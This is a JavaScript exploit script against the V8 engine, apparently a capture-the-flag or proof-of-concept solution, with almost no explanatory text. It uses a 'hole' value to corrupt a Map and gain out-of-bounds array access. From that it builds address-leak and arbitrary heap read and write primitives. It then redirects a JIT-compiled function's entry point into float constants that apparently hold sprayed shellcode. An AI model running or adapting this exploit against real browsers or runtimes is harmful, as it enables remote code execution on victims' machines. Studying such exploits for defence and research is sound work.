const foo = ()=>
{
    return [1.0,
        1.95538254221075331056310651818E-246,
        1.95606125582421466942709801013E-246,
        1.99957147195425773436923756715E-246,
        1.95337673326740932133292175341E-246,
        2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x1000000; i++) {foo();foo();foo();foo();}

// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
//

const set = new Set();
var map = new Map();
const hole = set.hole();

map.set(1, 1);
map.set(hole, 1);
map.delete(hole);
map.delete(hole);
map.delete(1);

const oob_arr = [1.1, 1.1, 1.1, 1.1];
const victim_arr = [2.2, 2.2, 2.2, 2.2];
const obj_arr = [{}, {}, {}, {}];

map.set(0x1b, -1);
map.set(0x111, 0);

data = ftoi(oob_arr[10]);
ori_victim_arr_elem = data & 0xffffffffn;

function addrof(o) {
    oob_arr[10] = itof((0x8n << 32n) | ori_victim_arr_elem); // set victim_arr's element pointer & size
    oob_arr[21] = itof((0x8n << 32n) | ori_victim_arr_elem); // set obj_arr's element pointer & size
    obj_arr[0] = o;
    return ftoi(victim_arr[0]) & 0xffffffffn;
}

function heap_read64(addr) {
    oob_arr[10] = itof((0x8n << 32n) | (addr-0x8n)); // set victim_arr's element pointer & size. Have to -8 so victim_arr[0] can points to addr
    return ftoi(victim_arr[0]);
}

function heap_write64(addr, val) {
    oob_arr[10] = itof((0x8n << 32n) | (addr-0x8n)); // set victim_arr's element pointer & size. Have to -8 so victim_arr[0] can points to addr
    victim_arr[0] = itof(val);
}

const f_code = heap_read64(addrof(foo)+0x18n) & 0xffffffffn;
var f_code_entry_point = heap_read64(f_code+0x10n);

heap_write64(f_code+0x10n, f_code_entry_point+0x7cn);

foo();
